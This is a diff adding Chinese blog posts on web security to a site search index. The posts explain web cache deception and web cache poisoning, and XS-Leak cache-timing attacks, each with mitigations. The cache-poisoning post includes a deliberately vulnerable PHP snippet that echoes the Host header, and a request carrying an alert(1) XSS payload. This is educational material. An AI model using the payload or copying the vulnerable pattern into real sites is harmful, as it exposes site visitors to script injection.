+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><ul>
+<li>确定是否架设了CDN、负载均衡器、反向代理等缓存设备。</li>
+<li>观察响应头是否设置<code>Cache Control: no-cache,max-age=0,private, no-store</code>。</li>
+<li><a href="https://github.com/arbazkiraak/web-cache-deception-checker" target="_blank" rel="noopener">web-cache-deception-checker</a></li>
+</ul>
+<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><ul>
+<li>严格配置缓存策略，只有当文件的HTTP缓存头部允许缓存时，才会缓存文件。</li>
+<li>在处理不存在资源时，返回404/302，而不是返回上一级的内容。</li>
+<li>设置<code>Vary:Cookie</code>根据Cookie设置缓存，不同cookie的用户缓存页面不相同。</li>
+</ul>
+<h1 id="web缓存投毒"><a href="#web缓存投毒" class="headerlink" title="web缓存投毒"></a>web缓存投毒</h1><p>Web缓存投毒在以前一直是一个难以琢磨的漏洞，是一种理论上但实际难以利用的问题。在2018年BlackHat上，提出了实战的几个例子，证明了器危害和可利用性。<br>web缓存投毒(Web Cache Poisonning)的攻击方式是使得缓存机制缓存了有害的页面，当正常用户命中该缓存时，就会被有害页面攻击。</p>
+<p>它的整个过程如下图所示:</p>
+<p><img src="1.png" alt=""></p>
+<p>那么如何使得缓存机制缓存有害的页面？在这里先介绍一个Vary响应头，MDN解释它决定了对于未来的一个请求头，应该用一个缓存的回复还是向源服务器请求一个新的回复。举例<code>Vary:User-Agent</code>时，会根据User-Agent的值来返回缓存，以防移动端获取了PC端的缓存。这里的User-Agent成为了缓存键。</p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>如存在一个页面它存在self XSS，比如。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">    &lt;html class&#x3D;&quot;no-js&quot; lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">        &lt;title&gt;Sample&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;&#x2F;&lt;?php echo $_SERVER[&#39;SERVER_NAME&#39;]； ?&gt;&#x2F;static&#x2F;css&#x2F;main.css&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>它接收攻击者可控的Host头直接输出在页面上，且攻击者无法控制用户的HTTP头，从而是一个self XSS。于是攻击者发送如下的请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">    Host: example.com&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+<p>将有害的页面存储下来了，那么其他用户访问这同意资源时，就会触发XSS漏洞，通过缓存投毒，一个self xss就转变为了存储型XSS了。</p>
+<h1 id="缓解措施-1"><a href="#缓解措施-1" class="headerlink" title="缓解措施"></a>缓解措施</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://r1dd1er.top/2020/02/10/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92&%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97/" target="_blank" rel="noopener">Web缓存投毒与缓存欺骗</a></li>
+<li><a href="https://xz.aliyun.com/t/2585" target="_blank" rel="noopener">实战web缓存中毒</a></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>xs-leak攻击-HTTP缓存跨站点泄漏</title>
+    <url>/2020/07/18/xs-leak/</url>
+    <content><![CDATA[<p>XS-Leak攻击本质上是一个浏览器侧信道攻击，可被用来推断并收集用户信息。它的原理类似Meltdown漏洞实现的一个名为”Flush &amp; Reload”攻击，有兴趣的可以看看。它利用了命中缓存与未命中缓存之间的时间响应来获取信息。攻击的核心是检测一个查询询问是否有结果。</p>
+<a id="more"></a>
+
+<h1 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h1><p>XS-Leak攻击实施起来分为3个步骤:</p>
+<ul>
+<li>删除目标浏览器中特定的缓存</li>
+<li>打开目标浏览器查询相关内容</li>
+<li>检查浏览器是否缓存了相关内容</li>
+</ul>
+<p>使用例子稍微地解释一下，假设用户A对某一特定资源拥有访问权限，而普通用户对某一资源没有访问权限。对于攻击者来说，他可以清空浏览器中对于某一特定资源的访问权限，然后诱使用户A请求该特定资源，最后继续诱使A请求该特定资源，判断第二次请求该资源时的响应时间，若该时间短，则说明第一次请求时缓存了特定资源，否则，则没有。通过这个，攻击者就可以判断出用户A是否对某一特定资源具有访问权限。  </p>
+<p>在上面的整个过程中，攻击者需要满足以下能力:</p>
+<ul>
+<li>能够删除用户浏览器中的特定缓存。</li>
+<li>能够使得用户发起对特定资源的请求。</li>
+<li>能够获取请求响应的时间。</li>
+</ul>
+<p><strong>删除缓存</strong><br>删除缓存的方式有这几种方式:1)发送post请求;2)使用fetch API “reload”以在服务器上返回错误的方式(设计超长的HTTP referer)2)设计过长的url，使得服务器报错清空之前的缓存。</p>
+<p><strong>发起请求</strong><br>使得受害者访问攻击者设计的网站，攻击者的网站中会使得受害者访问特定资源。在一定情况下，攻击者会缓存要检查的网页资源。  </p>
+<p><strong>获取请求响应时间</strong><br>由于攻击者会将资源缓存下来，因此，当受害者再此访问攻击者的网站，其中的资源会因为已经呗缓存在客户端从而可以访问。</p>
+<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><p>前面说到此攻击可以知道受害者是否对某一特定资源具有访问权限，知道这点以后能得出什么样的信息呢？  </p>
+<ul>
+<li>社交网络中获取受害者社交网络的用户名，以确定受害者在社交网络中的身份。</li>
+</ul>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
+<li><a href="https://github.com/xsleaks/xsleaks" target="_blank" rel="noopener">xsleaks</a></li>
+</ul>
+<p>在这个工具中，可以看到它有实现了一个demo。</p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
+<li>禁用HTTP缓存(不太可能)</li>
+<li>在所有内容上加上CSRF tokens</li>
+<li>使用Same Site=strict cookie对用户进行身份验证。</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://github.com/xsleaks/xsleaks/wiki/Links" target="_blank" rel="noopener">xsleaks</a></li>
+<li><a href="https://blog.csdn.net/Sunny_Ducky/article/details/106636236" target="_blank" rel="noopener">【翻译】XS-Leaks攻击简介</a></li>
+<li><a href="https://www.anquanke.com/post/id/176049" target="_blank" rel="noopener">XSLeaks 攻击分析 —— HTTP缓存跨站点泄漏</a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>xs-leak</tag>
       </tags>
   </entry>
 </search>
